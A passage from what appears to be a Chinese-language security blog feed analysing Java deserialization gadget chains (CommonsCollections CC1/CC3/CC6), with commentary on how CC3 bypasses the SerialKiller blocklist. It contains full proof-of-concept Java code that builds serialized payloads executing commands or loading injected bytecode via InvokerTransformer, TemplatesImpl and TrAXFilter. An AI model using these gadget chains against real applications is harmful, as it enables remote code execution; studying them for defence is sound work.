class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>( lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryFiled.set(lazyMap,chainedTransformer);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br><br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br>        <br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryFiled.set(outerMap, chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706864.png"></p><h3 id="CC3-（InstantiateTransformer）"><a href="#CC3-（InstantiateTransformer）" class="headerlink" title="CC3 （InstantiateTransformer）"></a>CC3 （<font style="color:rgb(26, 32, 44);">InstantiateTransformer</font>）</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707898.png"></p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>而在 ysoserial 中并没有使用 <strong><font style="color:rgb(44, 62, 80);">InvokerTransformer</font></strong><font style="color:rgb(44, 62, 80);">，这是因为黑名单过滤时很有可能会将 </font><strong><font style="color:rgb(44, 62, 80);">InvokerTransformer </font></strong><font style="color:rgb(44, 62, 80);">直接禁用，为了更广泛的使用， ysoserial 换了一条路：</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707295.png"></p><blockquote><p>《Java 安全漫谈》中也有提及</p><p>2015年初，@frohoff和@gebl发布了Talk<a href="https://frohoff.github.io/appseccali-marshalling-pickles/">《Marshalling Pickles: how deserializing objects will ruin your day》</a>，以及Java反序列化利用工具ysoserial，随后引爆了安全界。开发者们自然会去找寻一种安全的过滤方法，于是类似 <a href="https://github.com/ikkisoft/SerialKiller">Serialkiller</a> 这样的工具随之诞生。</p><p>SerialKiller是一个ava反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的<a href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf">黑名单</a>：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011716289.png"></p><p>这个黑名单中InvokerTransformer赫然在列，也就切断了CommonsCollections1的利用链。有攻就有防，ysoserial随后增加了不少新的Gadgets，其中就包括CommonsCollections3。</p><p>CommonsCollections3的目的很明显，就是为了绕过一些规则对InvokerTransformer的限制。CommonsCollections3并没有使用到InvokerTransformer来调用任意方法，而是用到了另一个类，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAxFilter</code>。</p></blockquote><p>现在继续找 <font style="color:#080808;background-color:#ffffff;">newTransformer 的用法：</font></p><p>这里的 <code>Process</code> 只是 <code>exec()</code> 的返回值，如果你不去读它的输出或等待它结束，它就没用了，一般对象，不用它</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707624.png"></p><p><code>getOutProperties</code><font style="color:rgb(80, 80, 92);">，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707947.png"></p><p><font style="color:rgb(80, 80, 92);">TransformerFactoryImpl 不能序列化，并且构造函数传参困难</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708644.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708046.png"></p><p><font style="color:#080808;background-color:#ffffff;">TrAXFilter 也不能序列化，但构造函数简单，想着调用 TrAXFilter 的构造函数</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708403.png"></p><p>那么如何使用 <font style="color:#080808;background-color:#ffffff;">TrAXFilter 的构造函数，这里用到了 </font><font style="color:rgb(26, 32, 44);">InstantiateTransformer</font></p><p><font style="color:rgb(26, 32, 44);">InstantiateTransformer.</font><font style="color:#080808;background-color:#ffffff;">transform  判断传入的参数是否为 Class 类型，如果是，获取指定构造器，调用构造函数。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708848.png"></p><h4 id="构造POC："><a href="#构造POC：" class="headerlink" title="构造POC："></a>构造POC：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//添加</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//修改</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708853.png"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>本次就将 CC1、CC3、CC6放在一起吧：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708436.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC6</title>
    <link href="/2025/08/31/CC6/"/>
    <url>/2025/08/31/CC6/</url>
    
    <content type="html"><![CDATA[<h1 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h1><p>JDK 8u71:</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p><font style="color:rgb(80, 80, 92);">Comoons-Collections 3.2.1</font></p><h1 id="CC6-链分析："><a href="#CC6-链分析：" class="headerlink" title="CC6 链分析："></a>CC6 链分析：</h1><p>在 CC1 中分析过 JDK 8u71之后的 AnnotationInvocationHandler.readObject 的写法改变，导致 CC1 链用不了，也就是说：</p><p>AnnotationInvocationHandler.readObject</p><p>AnnotationInvocationHandler.invoke.memberValues.get</p><p>这半条链子用不了，所以要找一个替代，这个替代也应该调用了 LazyMap.get 方法，之后的链子和 CC1 一样。</p><h2 id="1、分析"><a href="#1、分析" class="headerlink" title="1、分析"></a>1、分析</h2><p>我们找到 TiedMapEntry.getValue 中调用了 get 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815897.png"></p><p>而 TiedMapEntry.hashCode 调用了 getValue ，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815168.png"></p><p>那么我们找哪里调用了 TiedMapEntry.hashCode 就可以完成利用链的跟踪</p><blockquote><p>这里我用的是《Java 安全漫谈》给出的思路：</p><p>ysoserial 中，是利用 java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key)，最后到 TiedMapEntry#hashCode()。</p><p>实际上我发现，在 java.util.HashMap#readobject 中就可以找到 HashMap#hash() 的调用，去掉了最前面的两次调用：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br>    ...<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br>    ...<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; 